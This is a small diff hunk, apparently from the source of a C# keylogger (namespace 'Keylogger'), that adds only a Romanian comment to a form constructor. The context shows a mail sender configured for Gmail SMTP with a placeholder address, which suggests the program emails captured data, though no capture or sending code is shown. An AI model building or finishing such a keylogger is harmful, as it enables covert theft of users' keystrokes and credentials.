@@ -29,7 +29,7 @@ namespace Keylogger
         public Form1()
         {
             InitializeComponent();
-
+            //comentariu
 
             _proxy = new Proxy();
             _mailSender = new MailSender("smtp.gmail.com", 587, "YOUR-EMAIL-1@gmail.com");// email doar de tip gmail.
